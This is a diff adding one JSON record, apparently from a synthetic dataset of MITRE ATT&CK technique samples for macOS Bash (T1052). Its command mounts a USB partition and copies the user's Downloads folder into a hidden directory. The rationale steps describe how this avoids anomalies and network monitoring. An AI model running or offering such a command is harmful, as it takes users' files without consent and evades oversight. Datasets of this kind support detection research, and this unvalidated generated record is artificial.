@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "diskutil mount disk2s1 && mkdir -p \"/Volumes/ARCHIVE/.dl\" && cp -Rp \"$HOME/Downloads\" \"/Volumes/ARCHIVE/.dl/\"",
+  "explanation": "Mounts a detected external partition and copies the Downloads folder to a concealed location on the USB.",
+  "rationale_steps": [
+    "Mount the removable media partition locally using diskutil.",
+    "Prepare a hidden destination directory on the USB volume.",
+    "Copy data preserving attributes to minimize anomalies.",
+    "Remain fully local to avoid network-based monitoring."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-06d48d2a-8b3244f9",
+  "source_prompt_hash": "06d48d2a",
+  "timestamp_utc": "2025-09-30T05:16:28.232349Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
